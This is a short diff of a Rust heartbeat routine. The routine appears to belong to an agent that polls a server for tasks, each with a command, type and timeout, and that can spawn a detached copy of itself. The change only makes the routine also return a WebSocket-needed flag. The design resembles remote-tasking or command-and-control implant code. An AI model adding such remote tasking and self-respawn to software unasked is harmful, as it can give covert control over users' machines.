@@ -34,8 +34,8 @@ pub(crate) async fn heartbeat_tick(
     agent_id: &str,
     session_key: Option<&[u8; 32]>,
     module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
-) -> Result<(), String> {
-    let task = http.heartbeat(agent_id, session_key).await?;
+) -> Result<bool, String> {
+    let (task, ws_needed) = http.heartbeat(agent_id, session_key).await?;
     if let Some(ref task) = task {
         libra_common::dlog!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
             task.id,
@@ -91,7 +91,7 @@ pub(crate) async fn heartbeat_tick(
             ExitAction::None => {}
         }
     }
-    Ok(())
+    Ok(ws_needed)
 }
 
 /// Spawn a detached copy of the current executable (the agent binary).
